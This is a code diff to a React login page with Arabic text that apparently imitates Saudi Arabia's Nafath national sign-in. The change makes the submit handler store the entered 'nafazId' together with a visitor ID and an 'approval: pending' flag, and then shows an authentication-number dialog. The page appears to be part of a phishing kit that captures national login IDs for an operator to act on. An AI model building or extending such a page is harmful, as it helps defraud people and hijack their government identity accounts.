@@ -37,13 +37,14 @@ export default function Component() {
     }
   }, [])
   const handleLogin = (e:any) => {
+    e.preventDefault()
+
     // Generate random 6-digit authentication number
     const visitorId = localStorage.getItem("visitor")
     setShowError('')
 
-    e.preventDefault()
     setIsLoading(true)
-    addData({id:visitorId,authNumber:"...",approval:"pending"})
+    addData({id:visitorId,nafazId:idLogin, authNumber:"...",approval:"pending"})
     setTimeout(() => {
       setShowAuthDialog(true)
     setIsLoading(false)
@@ -76,6 +77,7 @@ export default function Component() {
           <div className="w-8 h-1 bg-white mx-auto"></div>
         </div>
 
+      <form onSubmit={handleLogin}>
         {/* Login Form */}
         <Card className="bg-white">
           <CardContent className="p-6 space-y-4">
@@ -90,7 +92,7 @@ export default function Component() {
 {showError &&<Alert  className="text-sm text-red-500 flex justify-between bg-red-50" dir="rtl">
 <ShieldAlert color="red" className="text-right "/> {showError}
 </Alert>
-}            <Button onClick={handleLogin} disabled={isloading} className="w-full bg-teal-600 hover:bg-teal-700 text-white h-12 text-lg">
+}            <Button type="submit" disabled={isloading} className="w-full bg-teal-600 hover:bg-teal-700 text-white h-12 text-lg">
               تسجيل الدخول{isloading&&<Loader2Icon className="animate-spin"/>}
             </Button>
 
@@ -113,7 +115,7 @@ export default function Component() {
             </div>
           </CardContent>
         </Card>
-
+        </form>
         {/* User and Password Section */}
         <div className="bg-gray-200 p-4 rounded-lg text-center">
           <div className="text-gray-700 font-semibold">اسم المستخدم وكلمة المرور</div>
